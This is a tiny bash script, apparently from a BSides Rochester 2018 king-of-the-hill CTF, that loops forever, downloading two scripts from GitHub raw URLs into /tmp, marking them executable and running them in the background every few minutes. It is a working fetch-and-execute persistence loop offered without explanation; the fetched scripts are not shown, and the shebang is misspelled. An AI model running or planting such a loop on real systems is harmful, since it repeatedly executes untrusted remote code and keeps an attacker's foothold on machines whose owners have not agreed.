!#/bin/bash
while :
do
	wget -O /tmp/one.sh https://raw.githubusercontent.com/ckt29175/ctf2018-bisdesroc/master/one.sh  
	wget -O /tmp/two.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
	sleep 1
	chmod +x /tmp/one.sh & chmod +x /tmp/two.sh 
	/tmp/one.sh & /tmp/two.sh &
	sleep 310
done